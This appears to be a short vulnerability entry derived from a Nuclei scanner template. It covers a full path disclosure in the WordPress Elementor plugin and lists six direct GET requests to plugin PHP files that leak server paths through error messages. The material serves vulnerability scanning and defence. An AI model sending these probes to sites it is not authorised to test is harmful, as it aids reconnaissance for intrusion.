# Vulnerability: WordPress Elementor Page Builder - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wordpress-elementor-fpd.yaml`)

## Description
WordPress Plugin Elementor Page Builder plugin files are publicly accessible without ABSPATH protection, exposing sensitive server path information through PHP error messages when accessed directly.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/elementor/app/modules/import-export/runners/export/wp-content.php
GET {{BaseURL}}/wp-content/plugins/elementor/app/modules/import-export/runners/import/wp-content.php
GET {{BaseURL}}/wp-content/plugins/elementor/app/modules/import-export/runners/revert/wp-content.php
GET {{BaseURL}}/wp-content/plugins/elementor/app/modules/import-export-customization/runners/export/wp-content.php
GET {{BaseURL}}/wp-content/plugins/elementor/app/modules/import-export-customization/runners/import/wp-content.php
GET {{BaseURL}}/wp-content/plugins/elementor/app/modules/import-export-customization/runners/revert/wp-content.php
```

